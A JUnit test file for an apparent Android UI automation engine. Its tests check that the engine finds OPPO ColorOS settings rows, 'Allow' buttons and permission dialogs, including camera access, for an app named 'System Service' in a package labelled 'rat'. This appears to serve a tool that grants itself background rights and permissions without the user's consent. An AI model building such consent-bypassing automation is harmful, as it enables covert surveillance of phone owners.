package com.vendor.rat.auto.engine.vendor;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.testutil.UiDumpFixture;

import org.junit.Test;

import static org.junit.Assert.*;

/**
 * OppoEngine Fixture 驱动测试
 *
 * 基于 OPPO Find X6 (ColorOS 16, Android 16) 真机 ADB dump 的 UI XML,
 * 验证 OppoEngine 各阶段的节点查找逻辑。
 *
 * 不模拟 click/scroll 副作用 — 只验证"能找到正确节点"。
 */
public class OppoEngineFixtureTest {

    // ============ case 0: 应用详情页 — 找到"耗电管理" ============

    @Test
    public void appDetail_findBatteryManagement_byText() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/app_detail.xml");
        assertNotNull("fixture 加载失败", root);

        // OppoEngine case 0: buildPowerManageFilter() → COLORS_SETTINGS_POWER_MANAGE_TEXT
        // 真机文本: "耗电管理"
        UiNode target = root.findOneByCombine(
            CombineFilter.and(
                StringCondition.className("android.widget.TextView"),
                StringCondition.textContains("耗电管理")
            ));
        assertNotNull("应用详情页应能找到'耗电管理'文本", target);
        assertEquals("耗电管理", target.getText());
    }

    @Test
    public void appDetail_findAppName_SystemService() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/app_detail.xml");

        // OppoEngine k0() 文本匹配: 验证 appName 在页面中可见
        UiNode appName = root.findOneByCombine(
            CombineFilter.and(
                StringCondition.className("android.widget.TextView"),
                StringCondition.textContains("System Service")
            ));
        assertNotNull("应用详情页应显示 app 名称 'System Service'", appName);
    }

    @Test
    public void appDetail_hasScrollableRecyclerView() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/app_detail.xml");

        // OppoEngine case 0: getScrollableNode() 查找 RecyclerView
        UiNode recycler = root.findOneByCombine(
            StringCondition.className("androidx.recyclerview.widget.RecyclerView"));
        assertNotNull("应用详情页应有 RecyclerView", recycler);
    }

    // ============ case 1: 耗电管理页 — 找到"完全允许后台行为" ============

    @Test
    public void powerControl_findFullBackgroundRow() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/power_control.xml");
        assertNotNull("fixture 加载失败", root);

        // OppoEngine r0(): findRowWithChild(buildFullBackgroundFilter())
        // 真机文本: "完全允许后台行为"
        UiNode textNode = root.findOneByCombine(
            CombineFilter.and(
                StringCondition.className("android.widget.TextView"),
                StringCondition.textContains("完全允许后台行为")
            ));
        assertNotNull("耗电管理页应找到'完全允许后台行为'", textNode);
    }

    @Test
    public void powerControl_findClickableRowWithChild() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/power_control.xml");

        // OppoEngine: findOneByCombineWithChild(clickable, textFilter)
        UiNode row = root.findOneByCombineWithChild(
            CombineFilter.clickable(),
            CombineFilter.and(
                StringCondition.className("android.widget.TextView"),
                StringCondition.textContains("完全允许后台行为")
            ));
        assertNotNull("应找到包含'完全允许后台行为'的 clickable 行", row);
        assertTrue("行应为 clickable", row.isClickable());
    }

    @Test
    public void powerControl_hasRadioButton() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/power_control.xml");

        // ColorOS 16 使用 RadioButton 而非 Switch
        UiNode radio = root.findOneByCombine(
            StringCondition.className("android.widget.RadioButton"));
        assertNotNull("耗电管理页应有 RadioButton", radio);
        assertTrue("RadioButton 应 checkable", radio.isCheckable());
    }

    @Test
    public void powerControl_noSwitchWidget() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/power_control.xml");

        // 验证: ColorOS 16 耗电管理页没有 Switch
        UiNode switchNode = root.findOneByCombine(
            StringCondition.className("android.widget.Switch"));
        assertNull("耗电管理页不应有 Switch (ColorOS 16 用 RadioButton)", switchNode);
    }

    @Test
    public void powerControl_noAutoStartSwitch() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/power_control.xml");

        // 验证: ColorOS 16 耗电管理页没有"自启动"选项
        UiNode autoStart = root.findOneByCombine(
            CombineFilter.and(
                StringCondition.className("android.widget.TextView"),
                StringCondition.textContains("自启动")
            ));
        assertNull("耗电管理页不应有'自启动' (ColorOS 16 已移除)", autoStart);
    }

    // ============ case 2: 确认对话框 — 找到"允许"按钮 ============

    @Test
    public void powerDialog_findAllowButton_byId() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/power_dialog.xml");
        assertNotNull("fixture 加载失败", root);

        // OppoEngine: 确认对话框 android:id/button1 = "允许"
        UiNode allowBtn = root.findOneByCombine(
            StringCondition.viewId("android:id/button1"));
        assertNotNull("对话框应有 android:id/button1 (允许)", allowBtn);
        assertEquals("允许", allowBtn.getText());
        assertTrue("允许按钮应 clickable", allowBtn.isClickable());
    }

    @Test
    public void powerDialog_findAllowButton_byText() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/power_dialog.xml");

        // fallback: 通过文本查找
        UiNode btn = root.findOneByCombine(
            CombineFilter.button("允许"));
        assertNotNull("对话框应有'允许'按钮", btn);
    }

    @Test
    public void powerDialog_findCancelButton() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/power_dialog.xml");

        UiNode cancelBtn = root.findOneByCombine(
            StringCondition.viewId("android:id/button2"));
        assertNotNull("对话框应有 android:id/button2 (取消)", cancelBtn);
        assertEquals("取消", cancelBtn.getText());
    }

    @Test
    public void powerDialog_hasTitle() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/power_dialog.xml");

        UiNode title = root.findOneByCombine(
            StringCondition.viewId("com.oplus.battery:id/alertTitle"));
        assertNotNull("对话框应有标题", title);
        assertTrue("标题应包含'完全允许'", title.getText().contains("完全允许"));
    }

    // ============ 权限弹窗 — "使用时允许" ============

    @Test
    public void permissionPopup_findAllowForegroundButton() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/permission_popup.xml");
        assertNotNull("fixture 加载失败", root);

        // PermissionAutoGrantEngine: "使用时允许" 按钮
        UiNode btn = root.findOneByCombine(
            CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.textContains("使用时允许")
            ));
        assertNotNull("权限弹窗应有'使用时允许'按钮", btn);
        assertTrue("按钮应 clickable", btn.isClickable());
    }

    @Test
    public void permissionPopup_findByViewId() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/permission_popup.xml");

        // 通过 resource-id 查找 (更可靠)
        UiNode btn = root.findOneByCombine(
            StringCondition.viewId("com.android.permissioncontroller:id/permission_allow_foreground_only_button"));
        assertNotNull("权限弹窗应有 permission_allow_foreground_only_button", btn);
    }

    @Test
    public void permissionPopup_findDenyButton() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/permission_popup.xml");

        UiNode denyBtn = root.findOneByCombine(
            StringCondition.viewId("com.android.permissioncontroller:id/permission_deny_button"));
        assertNotNull("权限弹窗应有 deny 按钮", denyBtn);
        assertEquals("不允许", denyBtn.getText());
    }

    // ============ 权限管理列表页 ============

    @Test
    public void permissionList_findCameraPermission() {
        UiNode root = UiDumpFixture.load("fixtures/oppo/permission_list.xml");
        assertNotNull("fixture 加载失败", root);

        UiNode camera = root.findOneByCombine(
            CombineFilter.and(
                StringCondition.className("android.widget.TextView"),
                StringCondition.textContains("摄像头")
            ));
        assertNotNull("权限列表应显示'摄像头'权限", camera);
    }
}
